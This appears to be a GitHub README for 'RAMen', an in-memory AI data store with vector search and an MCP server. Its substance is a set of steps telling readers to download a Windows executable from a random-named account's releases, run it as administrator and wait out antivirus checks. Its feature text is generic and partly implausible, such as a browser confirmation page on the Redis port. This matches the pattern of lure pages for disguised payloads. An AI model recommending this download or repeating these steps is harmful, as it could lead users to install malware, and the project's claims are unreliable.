# 🍜 RAMen - Fast memory storage for modern AI

[![Download RAMen](https://img.shields.io/badge/Download-RAMen-blue.svg)](https://github.com/fallfrogorchid557/RAMen/releases)

RAMen stores data in your computer memory. This makes retrieving information nearly instant. Use this tool if you build AI agents or applications that need fast responses. It works like popular database software, but it includes special tools for artificial intelligence.

## ⚙️ How it works

Software applications often need to remember information quickly. RAMen acts as a digital notepad. When your AI program asks for data, RAMen serves it from the system memory. This prevents delays. It supports standard connection protocols, so you can swap it into existing workflows without changing your code. 

## 🚀 Getting started

You need a computer running Windows 10 or Windows 11. RAMen requires 512MB of free RAM to run smoothly. Ensure you have administrative rights on your machine to start the service.

1. Visit the [RAMen release page](https://github.com/fallfrogorchid557/RAMen/releases) to find the latest version.
2. Look for the file named `RAMen-windows-amd64.exe` in the list of assets.
3. Click the filename to save the file to your computer.
4. Move the file to a folder where you store your applications.

## 🛠️ Running the software

Because RAMen is a single file, you do not need an installer.

1. Open the folder where you saved the file.
2. Double-click `RAMen-windows-amd64.exe`.
3. A black window appears. This window shows the status of your data store.
4. Keep this window open while you use your AI tools. 
5. To stop the software, simply close the black window.

## 🧠 Using vector search

AI models represent words as numbers called vectors. RAMen allows your AI to search these numbers. You can ask your AI to find concepts that relate to each other even if they do not share the same words. RAMen stores these vectors in memory to ensure your AI searches happen in milliseconds.

## 📦 Semantic caching

LLMs generate expensive responses. Semantic caching saves these responses. If you ask a similar question twice, RAMen serves the previous answer from its memory. This saves time and reduces the costs associated with calling AI services repeatedly.

## 🤖 Built-in MCP server

The Model Context Protocol connects AI agents to your data. RAMen includes a native server for this protocol. Your agents can read from and write to your RAMen store without extra setup. This enables your AI to manage its own memory or state during complex tasks.

## 📋 Troubleshooting

If the window closes immediately, ensure you have the correct permissions. You may need to click "Run as administrator" when you open the file. Some antivirus software might check the file before it runs. Wait a few seconds if the screen does not appear right away. To confirm it works, open your web browser and go to `http://localhost:6379`. You should see a confirmation message from the RAMen service.

## 📂 Configuration options

RAMen detects your hardware by default. Advanced users can change settings via a configuration file. Create a file named `config.yaml` in the same folder as the application. You can limit how much memory RAMen uses in this file. RAMen reads these settings every time you start the program.

## 🛡️ Privacy and safety

RAMen keeps all data inside your computer memory. It does not send your data to external servers. Because it uses the BSD-3 license, you can use the software for personal or commercial projects. The tool deletes the cached data when you close the program, keeping your setup clean and secure after every session.